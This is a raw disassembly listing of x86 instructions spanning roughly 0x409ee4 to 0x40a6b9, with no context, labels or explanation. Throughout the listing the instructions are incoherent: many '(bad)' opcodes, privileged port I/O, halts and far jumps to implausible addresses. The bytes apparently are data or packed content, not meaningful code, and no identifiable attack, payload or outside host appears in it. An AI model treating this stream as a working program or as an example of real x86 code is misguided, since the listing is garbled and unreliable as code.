  409ee4:	ret    0xf302
  409ee7:	or     DWORD PTR [ebp+0x66de2b58],ebx
  409eed:	dec    eax
  409eee:	cmp    al,0x70
  409ef0:	mov    ds:0xc3b7aaa9,eax
  409ef5:	push   ebp
  409ef6:	cs lock sti 
  409ef9:	pop    ecx
  409efa:	(bad)  
  409efb:	pop    ecx
  409efc:	xlat   BYTE PTR ds:[ebx]
  409efd:	mov    dl,0xc8
  409eff:	or     BYTE PTR [edx+ecx*8],al
  409f02:	pop    edi
  409f03:	fidivr WORD PTR [edx]
  409f05:	int3   
  409f06:	loopne 0x409f04
  409f08:	dec    esi
  409f09:	inc    ecx
  409f0a:	pop    ds
  409f0b:	push   ebp
  409f0c:	(bad)  
  409f0d:	dec    edi
  409f0e:	push   eax
  409f0f:	clc    
  409f10:	mov    al,ds:0x412bdcea
  409f15:	dec    esp
  409f16:	and    eax,DWORD PTR [edx-0x6d8e7ada]
  409f1c:	aas    
  409f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f1e:	into   
  409f1f:	pop    eax
  409f20:	sub    ah,BYTE PTR [esi-0x2ab42e3b]
  409f26:	cwde   
  409f27:	xchg   esi,eax
  409f28:	inc    edx
  409f29:	pop    ebx
  409f2a:	cmc    
  409f2b:	cmp    DWORD PTR [esi+0x7a],0xffffffa9
  409f2f:	inc    eax
  409f30:	and    eax,0xcd232908
  409f35:	add    eax,0x882fba1e
  409f3a:	jne    0x409f0c
  409f3c:	fcmove st,st(4)
  409f3e:	hlt    
  409f3f:	sbb    eax,0x252fd094
  409f44:	mov    ecx,0xc10e5274
  409f49:	shr    DWORD PTR [ebx],cl
  409f4b:	mov    ch,0xf4
  409f4d:	movups XMMWORD PTR [eax-0x51],xmm1
  409f51:	sbb    al,0x8
  409f53:	into   
  409f54:	jns    0x409fb2
  409f56:	xchg   ecx,eax
  409f57:	adc    al,0x32
  409f59:	retf   0xa2a0
  409f5c:	adc    al,BYTE PTR [edi]
  409f5e:	and    al,0xf6
  409f60:	iret   
  409f61:	jno    0x409f38
  409f63:	jmp    0xc8d5ea52
  409f68:	mov    BYTE PTR [edi+esi*1-0x49],0x6d
  409f6d:	jno    0x409f4b
  409f6f:	mov    eax,ds:0xb622e8e1
  409f74:	push   ecx
  409f75:	cmc    
  409f76:	retf   0x6e75
  409f79:	outs   dx,DWORD PTR ds:[esi]
  409f7a:	sbb    DWORD PTR [esi-0x64],eax
  409f7d:	das    
  409f7e:	ficom  WORD PTR [edi]
  409f80:	test   BYTE PTR [eax],dh
  409f82:	jge    0x409fca
  409f84:	adc    al,0x9c
  409f86:	mov    ch,0xff
  409f88:	idiv   BYTE PTR [edx]
  409f8a:	add    al,BYTE PTR [ebx]
  409f8c:	mov    ds:0xda28ec77,eax
  409f91:	jb     0x40a00d
  409f93:	sub    eax,0xf0f4ba35
  409f98:	mov    BYTE PTR [ecx-0x3cf0ef9f],bh
  409f9e:	lock pop ds
  409fa0:	adc    ah,BYTE PTR [ebp+0x65]
  409fa3:	outs   dx,DWORD PTR ds:[esi]
  409fa4:	cwde   
  409fa5:	pop    ecx
  409fa6:	lahf   
  409fa7:	push   ebx
  409fa8:	inc    ebx
  409fa9:	sbb    al,0xdc
  409fab:	fucomip st,st(5)
  409fad:	retf   0x80e5
  409fb0:	and    ebp,ecx
  409fb2:	repnz add edx,esi
  409fb5:	push   es
  409fb6:	mov    ah,0xcc
  409fb8:	mov    eax,ds:0x9c4d057
  409fbd:	sbb    eax,0x11ab528d
  409fc2:	call   0xb79ddca0
  409fc7:	add    DWORD PTR [esp+esi*4+0x4b6f32f4],eax
  409fce:	push   edx
  409fcf:	and    al,0x3c
  409fd1:	or     ecx,DWORD PTR [ecx]
  409fd3:	jmp    0x409f73
  409fd5:	push   0xffffffc8
  409fd7:	jl     0x40a01b
  409fd9:	jp     0x409fd3
  409fdb:	adc    eax,DWORD PTR [ecx-0x8545334]
  409fe1:	arpl   WORD PTR [ecx-0x70],bx
  409fe4:	mov    dh,bl
  409fe6:	add    eax,0xfd8ed904
  409feb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fec:	push   esp
  409fed:	lods   al,BYTE PTR ds:[esi]
  409fee:	das    
  409fef:	test   eax,0x96ae25da
  409ff4:	inc    esi
  409ff5:	popa   
  409ff6:	in     al,dx
  409ff7:	outs   dx,DWORD PTR ds:[esi]
  409ff8:	loop   0x409f9b
  409ffa:	cmp    DWORD PTR [edi+0x6aeedfd8],eax
  40a000:	icebp  
  40a001:	in     eax,0x74
  40a003:	pop    eax
  40a004:	adc    BYTE PTR [edx+0x4bae338f],al
  40a00a:	xchg   ebp,eax
  40a00b:	sar    DWORD PTR [esi+0xd],0xbe
  40a00f:	ret    0x702
  40a012:	jns    0x409fc6
  40a014:	addr16 into 
  40a016:	mov    ebp,0xf5cd7c24
  40a01b:	call   0xe2e71b70
  40a020:	out    0x81,al
  40a022:	push   esi
  40a023:	jmp    0x28a5:0xd2b1a3de
  40a02a:	mov    dl,0x82
  40a02c:	retf   0x8529
  40a02f:	inc    ebx
  40a030:	dec    eax
  40a031:	rcr    DWORD PTR [edi],1
  40a033:	add    cl,BYTE PTR [ecx-0x7ed747d4]
  40a039:	inc    esp
  40a03a:	dec    esi
  40a03b:	out    dx,eax
  40a03c:	loope  0x40a03c
  40a03e:	xor    cl,BYTE PTR [eax+0x64121336]
  40a044:	imul   ebp,DWORD PTR [eax-0x155138c6],0x61
  40a04b:	pop    eax
  40a04c:	or     esi,DWORD PTR [ebp+ebp*1-0x10]
  40a050:	or     eax,0xed788389
  40a055:	popf   
  40a056:	mov    ds:0x9f352bee,al
  40a05b:	scas   eax,DWORD PTR es:[edi]
  40a05c:	shl    DWORD PTR [ecx],0xe8
  40a05f:	and    BYTE PTR [ebp+0x65cd71e3],ah
  40a065:	imul   eax,DWORD PTR [esi-0x62],0x82914031
  40a06c:	add    edi,edi
  40a06e:	stos   DWORD PTR es:[edi],eax
  40a06f:	stc    
  40a070:	and    al,0x82
  40a072:	push   0xffffffd0
  40a074:	iret   
  40a075:	cmp    eax,0x4feb526a
  40a07a:	daa    
  40a07b:	pop    esp
  40a07c:	or     eax,DWORD PTR [esp+eiz*8-0x18]
  40a080:	push   ebp
  40a081:	sti    
  40a082:	lods   al,BYTE PTR ds:[esi]
  40a083:	in     al,0xd8
  40a085:	or     al,0x8
  40a087:	in     al,dx
  40a088:	pop    edi
  40a089:	in     eax,0xdd
  40a08b:	jns    0x40a0cf
  40a08d:	ds mov al,0x0
  40a090:	popa   
  40a091:	jbe    0x40a0d4
  40a093:	ror    eax,1
  40a095:	cs inc eax
  40a097:	imul   esi,DWORD PTR [ebx+0x6a249af1],0xf3bb0110
  40a0a1:	jge    0x40a0f6
  40a0a3:	add    cl,BYTE PTR [edx-0x39c62618]
  40a0a9:	cwde   
  40a0aa:	out    0x87,al
  40a0ac:	and    ebp,0xaa00411a
  40a0b2:	pop    eax
  40a0b3:	lock xchg esi,eax
  40a0b5:	add    BYTE PTR [ebp+0x6554d08b],dl
  40a0bb:	das    
  40a0bc:	xor    DWORD PTR [edi+0x69],esp
  40a0bf:	or     esi,DWORD PTR [ecx-0x2f06f681]
  40a0c5:	sbb    BYTE PTR [edi-0x12],ch
  40a0c8:	aas    
  40a0c9:	gs cmp dl,dh
  40a0cc:	inc    esp
  40a0cd:	fninit 
  40a0cf:	imul   eax,DWORD PTR [eax+0x24],0xcf607251
  40a0d6:	clc    
  40a0d7:	push   cs
  40a0d8:	xor    al,0xa1
  40a0da:	dec    ebp
  40a0db:	cli    
  40a0dc:	das    
  40a0dd:	or     al,0x27
  40a0df:	pop    DWORD PTR [eax]
  40a0e1:	push   eax
  40a0e2:	inc    eax
  40a0e3:	mov    eax,ds:0xd4449c6c
  40a0e8:	(bad)
  40a0ec:	inc    edx
  40a0ed:	call   0x6bd52d5d
  40a0f2:	inc    ecx
  40a0f3:	push   ecx
  40a0f4:	push   0x72
  40a0f6:	rcl    DWORD PTR [ebx-0x22],1
  40a0f9:	cmp    dh,BYTE PTR [eax-0x46]
  40a0fc:	in     al,0x3b
  40a0fe:	loop   0x40a14a
  40a100:	and    ecx,ebx
  40a102:	nop
  40a103:	dec    eax
  40a104:	xlat   BYTE PTR ds:[ebx]
  40a105:	cmp    DWORD PTR [ebp+0x7e7025bf],ecx
  40a10b:	mov    esp,DWORD PTR [ecx-0x661a4c5]
  40a111:	popa   
  40a112:	aad    0xa0
  40a114:	mov    cs,WORD PTR [ebp-0xe]
  40a117:	and    BYTE PTR gs:[esi+0x7ecaacd7],bh
  40a11e:	jno    0x40a0ed
  40a120:	xchg   esp,ecx
  40a122:	xor    BYTE PTR [ebx+0xf55df94],al
  40a128:	cwde   
  40a129:	inc    ebp
  40a12a:	in     eax,0xb
  40a12c:	fadd   QWORD PTR [edi-0x39]
  40a12f:	xchg   edi,eax
  40a130:	cmp    DWORD PTR [ebx],0xb5814641
  40a136:	mov    DWORD PTR [eax-0x46],eax
  40a139:	jp     0x40a133
  40a13b:	pop    ecx
  40a13c:	and    eax,0x4fc5d4c6
  40a141:	rcr    DWORD PTR [edx-0x2],cl
  40a144:	out    dx,eax
  40a145:	and    DWORD PTR [esi+0x3f],edx
  40a148:	arpl   WORD PTR [ecx],di
  40a14a:	or     ah,bh
  40a14c:	out    0x72,al
  40a14e:	pop    ebx
  40a14f:	aad    0xa0
  40a151:	loop   0x40a119
  40a153:	iret   
  40a154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a155:	add    BYTE PTR [ebp-0x56],ch
  40a158:	xor    ch,dh
  40a15a:	mov    ss,WORD PTR [edx-0x45]
  40a15d:	shl    esi,1
  40a15f:	or     ebp,ecx
  40a161:	(bad)  [edx+0x2b]
  40a164:	jmp    0x40a12a
  40a166:	fsub   st,st(1)
  40a168:	mov    al,ds:0x89ca9918
  40a16d:	mov    al,0xa
  40a16f:	or     al,0x69
  40a171:	fdiv   st,st(5)
  40a173:	std    
  40a174:	jmp    esp
  40a176:	sbb    edx,DWORD PTR [edx+0x3c]
  40a179:	cdq    
  40a17a:	mov    dl,0xf0
  40a17c:	or     al,BYTE PTR ds:[eax-0x7fe742ca]
  40a183:	test   eax,0x1e91e9c6
  40a188:	cmp    ebp,DWORD PTR [edi]
  40a18a:	aas    
  40a18b:	jae    0x40a1fc
  40a18d:	mov    dl,0x21
  40a18f:	mov    edi,0x6a531fc1
  40a194:	sub    ebx,DWORD PTR [eax+0x3f]
  40a197:	inc    eax
  40a198:	cdq    
  40a199:	cmp    BYTE PTR [ecx-0x423401a0],ch
  40a19f:	test   DWORD PTR [ecx+0xf95d287],ebp
  40a1a5:	(bad)  
  40a1a6:	test   DWORD PTR [eax-0x795b919a],0x707d6757
  40a1b0:	xor    eax,0xeb34e81b
  40a1b5:	mov    ch,0xf0
  40a1b7:	gs mov dl,0x27
  40a1ba:	test   DWORD PTR [eax+0x2a9b75de],edx
  40a1c0:	dec    ecx
  40a1c1:	sub    ebp,ebp
  40a1c3:	lds    ebp,FWORD PTR [ecx+0x50]
  40a1c6:	arpl   WORD PTR ds:0x9875facd,cx
  40a1cc:	daa    
  40a1cd:	mov    edx,0x1b1d7507
  40a1d2:	adc    BYTE PTR [esi+edx*4],cl
  40a1d5:	xchg   esi,eax
  40a1d6:	imul   ebp,DWORD PTR [ebp+0x75c114d6],0xffffffcb
  40a1dd:	mov    al,ds:0x512fd98c
  40a1e2:	xor    DWORD PTR [ecx],0xffffffce
  40a1e5:	dec    eax
  40a1e6:	retf   0x97ba
  40a1e9:	dec    ecx
  40a1eb:	out    0x89,al
  40a1ed:	(bad)  
  40a1ef:	out    dx,al
  40a1f0:	inc    ecx
  40a1f1:	fwait
  40a1f2:	mov    dl,0x16
  40a1f4:	cmp    eax,0xe8b3d651
  40a1f9:	ds dec esp
  40a1fb:	shr    ebx,0xda
  40a1fe:	xchg   ebx,eax
  40a1ff:	push   0x3a
  40a201:	jno    0x40a1d9
  40a203:	push   es
  40a204:	stc    
  40a205:	loop   0x40a261
  40a207:	hlt    
  40a208:	pop    edx
  40a209:	sbb    eax,0x4a164e29
  40a20e:	into   
  40a20f:	cs ffreep st(3)
  40a212:	out    0xeb,al
  40a214:	push   0xffffffda
  40a216:	mov    bh,0xf3
  40a218:	repz jo 0x40a270
  40a21b:	in     eax,dx
  40a21c:	sbb    BYTE PTR [ecx+esi*1],bh
  40a21f:	and    eax,eax
  40a221:	jmp    0x8163dbbc
  40a226:	pusha  
  40a227:	mov    bh,0x6
  40a229:	imul   ebp,DWORD PTR [esi-0x74],0xffffffd8
  40a22d:	or     BYTE PTR [edi+0x6df12b97],dl
  40a233:	rol    BYTE PTR [edx-0x651736d9],1
  40a239:	test   BYTE PTR [edi+edx*2-0x31e2957b],ah
  40a240:	inc    eax
  40a241:	jb     0x40a243
  40a243:	(bad)  
  40a244:	adc    al,0x7d
  40a246:	add    esi,DWORD PTR [ecx+0x62edc5de]
  40a24c:	jne    0x40a20e
  40a24e:	loopne 0x40a1e5
  40a250:	pop    eax
  40a251:	cmp    eax,0x841ef4a7
  40a256:	sbb    dl,BYTE PTR [edi-0xc]
  40a259:	iret   
  40a25a:	retf   
  40a25b:	cwde   
  40a25c:	and    al,0xe7
  40a25e:	int    0x2f
  40a260:	adc    eax,0x80264628
  40a265:	pop    esi
  40a266:	pop    eax
  40a267:	arpl   WORD PTR [esp+ecx*2],si
  40a26a:	mov    ch,0x8b
  40a26c:	push   edx
  40a26d:	mov    dh,0xda
  40a26f:	scas   al,BYTE PTR es:[edi]
  40a270:	dec    eax
  40a271:	int    0x3b
  40a273:	ret    
  40a274:	(bad)  [edi-0x32083db8]
  40a27a:	(bad)  
  40a27b:	xchg   edi,eax
  40a27c:	xchg   edi,eax
  40a27d:	cmp    al,0xbd
  40a27f:	xor    DWORD PTR [ecx-0x41],ebp
  40a282:	loope  0x40a25a
  40a284:	push   esp
  40a285:	or     eax,0x8f8e8285
  40a28a:	sbb    al,0x89
  40a28c:	and    ebx,ebp
  40a28e:	xor    BYTE PTR [esi+ecx*8-0x23],0x1b
  40a293:	sbb    BYTE PTR ds:[eax+0x5f16d89b],bh
  40a29a:	out    0x52,eax
  40a29c:	imul   esp,DWORD PTR [edi+esi*2],0xffffffb6
  40a2a0:	add    al,0x4d
  40a2a2:	ret    0x483e
  40a2a5:	jle    0x40a273
  40a2a7:	jp     0x40a271
  40a2a9:	dec    ebx
  40a2aa:	lods   al,BYTE PTR ds:[esi]
  40a2ab:	lahf   
  40a2ac:	out    dx,eax
  40a2ad:	iret   
  40a2ae:	dec    edx
  40a2af:	pop    edi
  40a2b0:	mov    eax,0x2c2c926b
  40a2b5:	out    0x1e,eax
  40a2b7:	cld    
  40a2b8:	pushf  
  40a2b9:	aas    
  40a2ba:	hlt    
  40a2bb:	xchg   esi,eax
  40a2bc:	xchg   edi,eax
  40a2bd:	popf   
  40a2be:	imul   ebx,DWORD PTR [edi],0x67
  40a2c1:	mov    BYTE PTR [edx-0x2],ah
  40a2c4:	push   0xbf8ab49d
  40a2c9:	add    BYTE PTR [esi+0x24e2fe2f],al
  40a2cf:	shl    DWORD PTR [edi-0x45],cl
  40a2d2:	mov    ecx,0xfe6a5190
  40a2d7:	(bad)  
  40a2d8:	jmp    0x40a2a3
  40a2da:	pop    edi
  40a2db:	ret    
  40a2dc:	pop    esp
  40a2dd:	ficomp DWORD PTR [eax+ebp*2+0x77e3e8b4]
  40a2e4:	sub    DWORD PTR [edi-0x9],ebp
  40a2e7:	pop    ss
  40a2e8:	sbb    esp,DWORD PTR [ebx+0x19]
  40a2eb:	and    al,0x7e
  40a2ed:	dec    edx
  40a2ee:	push   esp
  40a2ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2f0:	sbb    edx,esi
  40a2f2:	xchg   DWORD PTR [ebx],esp
  40a2f4:	mov    ds:0xf0976e0b,al
  40a2f9:	(bad)  
  40a2fa:	(bad)  
  40a2fc:	mov    ah,0x7f
  40a2fe:	mov    dh,0xcf
  40a300:	shr    DWORD PTR [ebp-0x1e],cl
  40a303:	jmp    0x228d0830
  40a308:	push   ds
  40a309:	sub    al,0x73
  40a30b:	push   0xc4671452
  40a310:	xor    al,0x17
  40a312:	ins    DWORD PTR es:[edi],dx
  40a313:	mov    DWORD PTR [ecx+eiz*1],0x93022c0b
  40a31a:	ror    DWORD PTR [esi],1
  40a31c:	pop    ebx
  40a31d:	jbe    0x40a2b8
  40a31f:	and    esi,eax
  40a321:	adc    DWORD PTR [edx+0x55],ecx
  40a324:	popf   
  40a325:	jge    0x40a2bf
  40a327:	shl    BYTE PTR [edi+0x52f07735],0x78
  40a32e:	push   es
  40a32f:	int3   
  40a330:	push   esi
  40a331:	add    DWORD PTR [ebp+0x33],eax
  40a334:	dec    ecx
  40a335:	cmc    
  40a336:	xor    DWORD PTR [edx+0xfb4729],0xdcd5424b
  40a340:	imul   esp,DWORD PTR [ebp-0x4e],0xffffff9a
  40a344:	jb     0x40a32b
  40a346:	mov    DWORD PTR [edx-0x5becb9f1],esi
  40a34c:	(bad)  
  40a34d:	(bad)  
  40a34f:	out    dx,eax
  40a350:	xchg   ecx,eax
  40a351:	and    dl,BYTE PTR [edi-0x7f]
  40a354:	repnz mov bl,0xaa
  40a357:	ja     0x40a395
  40a359:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a35b:	mov    al,0x7c
  40a35d:	sub    eax,DWORD PTR [edi]
  40a35f:	pop    esp
  40a360:	loopne 0x40a307
  40a362:	ss ins DWORD PTR es:[edi],dx
  40a364:	adc    BYTE PTR [esi+eax*8+0x162d2b42],bh
  40a36b:	jbe    0x40a3b8
  40a36d:	repz ja 0x40a2f9
  40a370:	inc    esi
  40a371:	stos   DWORD PTR es:[edi],eax
  40a372:	sub    eax,edx
  40a374:	jbe    0x40a381
  40a376:	fld    QWORD PTR [edi+0x2b56aa8]
  40a37c:	imul   esp,DWORD PTR [eax+0x3e267886],0xb05480c1
  40a386:	xchg   ebx,eax
  40a387:	adc    BYTE PTR [edi],ch
  40a389:	xchg   edi,eax
  40a38a:	outs   dx,BYTE PTR ds:[esi]
  40a38b:	sar    DWORD PTR ds:0x6e3e75fa,1
  40a391:	dec    edx
  40a392:	out    0x28,al
  40a394:	daa    
  40a395:	dec    edx
  40a396:	pop    ebx
  40a397:	imul   edx,DWORD PTR [esi],0x9152e6e
  40a39d:	mov    DWORD PTR [esi-0x28],edi
  40a3a0:	sbb    eax,0x13f1e132
  40a3a5:	sub    dh,BYTE PTR [ebx]
  40a3a7:	jb     0x40a339
  40a3a9:	leave  
  40a3aa:	inc    edx
  40a3ab:	jmp    0x82cef87e
  40a3b0:	aad    0x4
  40a3b2:	retf   
  40a3b3:	jecxz  0x40a3e9
  40a3b5:	xchg   ebx,eax
  40a3b6:	loopne 0x40a3eb
  40a3b8:	jg     0x40a3ab
  40a3ba:	xchg   edx,eax
  40a3bb:	mov    esp,0xd64613c8
  40a3c0:	xor    edx,DWORD PTR [esi-0x3a]
  40a3c3:	add    ecx,DWORD PTR [edx+0x32ffb350]
  40a3c9:	(bad)  
  40a3ca:	clc    
  40a3cb:	out    dx,al
  40a3cc:	sbb    bh,dl
  40a3ce:	pop    ds
  40a3cf:	mov    esi,0x1c4566ce
  40a3d4:	out    0x8c,al
  40a3d6:	lods   al,BYTE PTR ds:[esi]
  40a3d7:	push   ebx
  40a3d8:	mov    al,ds:0xc3471f2e
  40a3dd:	test   eax,0x809f554f
  40a3e2:	test   DWORD PTR [eax-0x6a828d9b],ebp
  40a3e8:	adc    DWORD PTR [edx],esi
  40a3ea:	aad    0xf2
  40a3ec:	sub    cl,BYTE PTR [ecx-0x3c]
  40a3ef:	jecxz  0x40a3ca
  40a3f1:	jo     0x40a37a
  40a3f3:	sbb    DWORD PTR [ebx+0x7f],ebx
  40a3f6:	scas   al,BYTE PTR es:[edi]
  40a3f7:	push   esp
  40a3f8:	mov    ecx,0x88df73c4
  40a3fd:	mov    cl,BYTE PTR [edx]
  40a3ff:	or     BYTE PTR [edi+0x7f],cl
  40a402:	jo     0x40a3ba
  40a404:	xchg   DWORD PTR [edx],ebx
  40a406:	stos   DWORD PTR es:[edi],eax
  40a407:	lods   eax,DWORD PTR ds:[esi]
  40a408:	jge    0x40a464
  40a40a:	fadd   st,st(6)
  40a40c:	sahf   
  40a40d:	lods   eax,DWORD PTR ds:[esi]
  40a40e:	test   DWORD PTR [eax],ecx
  40a410:	aaa    
  40a411:	sub    ah,BYTE PTR [ebx]
  40a413:	das    
  40a414:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a416:	push   ebx
  40a417:	ja     0xaed231c8
  40a41d:	sti    
  40a41e:	outs   dx,BYTE PTR ds:[esi]
  40a41f:	js     0x40a44e
  40a421:	xor    eax,0x4a439b77
  40a426:	inc    esp
  40a427:	mov    ah,0x84
  40a429:	ins    DWORD PTR es:[edi],dx
  40a42a:	das    
  40a42b:	ret    
  40a42c:	test   al,0xfd
  40a42e:	or     esi,DWORD PTR [ecx]
  40a430:	adc    al,0xd7
  40a432:	icebp  
  40a433:	lea    edi,[eax]
  40a435:	push   cs
  40a436:	iret   
  40a437:	adc    ah,BYTE PTR gs:[ebx+0x4a2824fa]
  40a43e:	push   ds
  40a43f:	lahf   
  40a440:	js     0x40a415
  40a442:	sub    esp,0x41c1eba5
  40a448:	jmp    0xe42b9c42
  40a44d:	(bad)  
  40a44e:	jg     0x40a440
  40a450:	retf   0x454e
  40a453:	jo     0x40a4d4
  40a455:	inc    ebp
  40a456:	jb     0x40a454
  40a458:	ja     0x40a43b
  40a45a:	iret   
  40a45b:	xchg   BYTE PTR [esi],ch
  40a45d:	mov    edi,0xb398edf8
  40a462:	mov    bl,0xe
  40a464:	fisttp DWORD PTR [edi+edi*8+0x29]
  40a468:	(bad)  
  40a469:	mov    bl,0x30
  40a46b:	xchg   ecx,eax
  40a46c:	push   cs
  40a46d:	mov    dh,0x38
  40a46f:	dec    ecx
  40a470:	(bad)  
  40a471:	mov    eax,0xfd0c5549
  40a476:	(bad)  [esi+0x682f288]
  40a47c:	cmp    DWORD PTR [eax-0x61],edx
  40a47f:	sub    ebp,DWORD PTR [eax]
  40a481:	push   cs
  40a482:	imul   ebx,DWORD PTR [edx-0x9],0xffffffec
  40a486:	jg     0x40a442
  40a488:	push   eax
  40a489:	mov    edi,0x7652c3ff
  40a48e:	les    edi,FWORD PTR [eax+edi*4-0x6ecaff7f]
  40a495:	out    dx,al
  40a496:	pop    es
  40a497:	inc    ebx
  40a498:	fldcw  WORD PTR [edx+0x0]
	...
  40a512:	add    BYTE PTR [eax],al
  40a514:	adc    eax,0x96f91681
  40a519:	(bad)  
  40a51a:	(bad)  
  40a51b:	in     eax,dx
  40a51c:	push   eax
  40a51d:	scas   eax,DWORD PTR es:[edi]
  40a51e:	(bad)  
  40a51f:	jp     0x40a4ff
  40a521:	adc    BYTE PTR [ecx],ch
  40a523:	scas   al,BYTE PTR es:[edi]
  40a524:	pop    ecx
  40a525:	push   edi
  40a526:	add    BYTE PTR [eax],al
  40a528:	outs   dx,BYTE PTR ds:[esi]
  40a529:	pop    es
  40a52a:	add    BYTE PTR [eax],al
  40a52c:	xchg   ebp,eax
  40a52d:	clc    
  40a52e:	mov    esp,0x7bcfd9bd
  40a533:	inc    esi
  40a534:	or     BYTE PTR [ebx+0x12c6c4bc],ah
  40a53a:	sbb    BYTE PTR [esi],cl
  40a53c:	imul   esi,DWORD PTR [ecx-0xf],0x42
  40a540:	stos   BYTE PTR es:[edi],al
  40a541:	or     dl,BYTE PTR [esp+edi*1-0x4a]
  40a545:	dec    esi
  40a546:	outs   dx,DWORD PTR ds:[esi]
  40a547:	pop    edx
  40a548:	retf   0x4693
  40a54b:	(bad)  
  40a54c:	mov    ebp,0x3987dd61
  40a551:	mov    cl,BYTE PTR [edx-0x55ecc073]
  40a557:	mov    dh,0xc9
  40a559:	mov    esi,0x60d9092
  40a55e:	jle    0x40a5ae
  40a560:	(bad)  
  40a561:	mov    eax,ds:0x5ea7062f
  40a566:	outs   dx,BYTE PTR ds:[esi]
  40a567:	push   esi
  40a568:	retf   0xdd05
  40a56b:	popa   
  40a56c:	fcom   DWORD PTR [ebx+ecx*2+0x1f]
  40a570:	repnz jecxz 0x40a5b3
  40a573:	(bad)  
  40a574:	cmp    cl,cl
  40a576:	outs   dx,BYTE PTR ds:[esi]
  40a577:	iret   
  40a578:	stos   DWORD PTR es:[edi],eax
  40a579:	sub    dh,BYTE PTR [ebp-0x77f53352]
  40a57f:	mov    eax,ds:0xbfb713e4
  40a584:	ins    BYTE PTR es:[edi],dx
  40a585:	mov    ah,0xb
  40a587:	jns    0x40a601
  40a589:	addr16 rcl eax,cl
  40a58c:	inc    edi
  40a58d:	ret    
  40a58e:	cs pop ecx
  40a590:	clc    
  40a591:	mov    al,ds:0xeaa0a3bd
  40a596:	out    dx,al
  40a597:	xor    al,0x7e
  40a599:	add    BYTE PTR [ebx+0x3382f790],dl
  40a59f:	loope  0x40a584
  40a5a1:	xor    ecx,ebp
  40a5a3:	iret   
  40a5a4:	aas    
  40a5a5:	xor    BYTE PTR [ebp-0x543aa2f1],bh
  40a5ab:	and    al,0xf5
  40a5ad:	scas   eax,DWORD PTR es:[edi]
  40a5ae:	lods   al,BYTE PTR ds:[esi]
  40a5af:	ins    BYTE PTR es:[edi],dx
  40a5b0:	sub    bh,dh
  40a5b2:	arpl   WORD PTR [edx],cx
  40a5b4:	icebp  
  40a5b5:	pushf  
  40a5b6:	stos   DWORD PTR es:[edi],eax
  40a5b7:	sub    al,0x64
  40a5b9:	xor    edi,DWORD PTR [ebx-0x3982429d]
  40a5bf:	mov    bl,0xe0
  40a5c1:	int    0xfc
  40a5c3:	jmp    0x3a4b1164
  40a5c8:	or     BYTE PTR [ebp+0x682e8740],dh
  40a5ce:	sub    BYTE PTR [edi-0x63],bh
  40a5d1:	mov    dl,0x9
  40a5d3:	jnp    0x40a582
  40a5d5:	fisub  DWORD PTR [eax+0x69]
  40a5d8:	into   
  40a5d9:	out    0xa9,al
  40a5db:	push   edi
  40a5dc:	mov    ecx,0x2b7c9e17
  40a5e1:	aam    0x54
  40a5e3:	push   ecx
  40a5e4:	icebp  
  40a5e5:	popf   
  40a5e6:	pop    esp
  40a5e7:	sbb    cl,dl
  40a5e9:	and    al,0x4c
  40a5eb:	adc    eax,0xed4b1959
  40a5f0:	and    al,BYTE PTR [ecx+0x2a3c3118]
  40a5f6:	mov    ch,0xd7
  40a5f8:	rol    bl,1
  40a5fa:	dec    eax
  40a5fb:	xchg   esi,eax
  40a5fc:	add    ebx,DWORD PTR [esi]
  40a5fe:	dec    esp
  40a5ff:	sbb    eax,0x55f25688
  40a604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a605:	adc    esi,ebp
  40a607:	dec    ecx
  40a608:	inc    ecx
  40a609:	shr    DWORD PTR ds:0x10ee8264,0x31
  40a610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a611:	cs loop 0x40a5ba
  40a614:	inc    esp
  40a615:	adc    ah,BYTE PTR [ecx]
  40a617:	sbb    DWORD PTR es:[eax-0x2e],esi
  40a61b:	adc    al,0x72
  40a61d:	mov    cl,0xf0
  40a61f:	push   ebx
  40a620:	cld    
  40a621:	jnp    0x40a5dc
  40a623:	in     eax,0x95
  40a625:	push   0x21
  40a627:	in     al,dx
  40a628:	cmp    edx,DWORD PTR [ebx]
  40a62a:	mov    cl,0x35
  40a62c:	(bad)  
  40a62d:	mov    esi,?
  40a62f:	pop    edx
  40a630:	mov    edi,0xf6e65fd6
  40a635:	fstp   QWORD PTR [ecx+0x6c2e32f6]
  40a63b:	ret    
  40a63c:	xchg   ecx,eax
  40a63d:	push   eax
  40a63e:	dec    esi
  40a63f:	pop    esi
  40a640:	pop    es
  40a641:	cld    
  40a642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a643:	cld    
  40a644:	not    BYTE PTR [esp+edx*2+0x7d1e074]
  40a64b:	inc    ebp
  40a64c:	or     cl,BYTE PTR [ecx+0x2d4af075]
  40a652:	fmul   DWORD PTR [edi+0x10]
  40a655:	mov    gs,ebp
  40a657:	add    eax,0xfa887077
  40a65c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a65d:	test   eax,0xeb759c25
  40a662:	sub    al,BYTE PTR [edi-0x4c]
  40a665:	iret   
  40a666:	dec    eax
  40a667:	push   0xffffffef
  40a669:	xchg   BYTE PTR [ebp-0x218b753],dh
  40a66f:	cmp    ebp,DWORD PTR ds:0x45b2bcf1
  40a675:	jne    0x40a6f1
  40a677:	sub    BYTE PTR [ebx-0x4c90daf9],bl
  40a67d:	jae    0x40a677
  40a67f:	mov    DWORD PTR [ebx+0x2d],ebx
  40a682:	or     bl,dh
  40a684:	jb     0x40a6be
  40a686:	add    edx,DWORD PTR [edi+esi*4-0x33]
  40a68a:	loop   0x40a6cf
  40a68c:	mov    ecx,0x4d48de3e
  40a691:	(bad)
  40a694:	(bad)  
  40a695:	adc    al,0x30
  40a697:	fxch   st(6)
  40a699:	std    
  40a69a:	xor    DWORD PTR [ecx+0x4e],esi
  40a69d:	in     al,dx
  40a69e:	cmp    DWORD PTR [edi],0x1e
  40a6a1:	stos   DWORD PTR es:[edi],eax
  40a6a2:	xor    BYTE PTR [eax+0x5320f018],0xf4
  40a6a9:	cmp    DWORD PTR [ecx-0x2b],0x5bf09f0d
  40a6b0:	(bad)  
  40a6b1:	repz xchg esi,eax
  40a6b3:	and    bh,ch
  40a6b5:	jge    0x40a734
  40a6b7:	out    0xef,al
  40a6b9:	out    0x2b,al
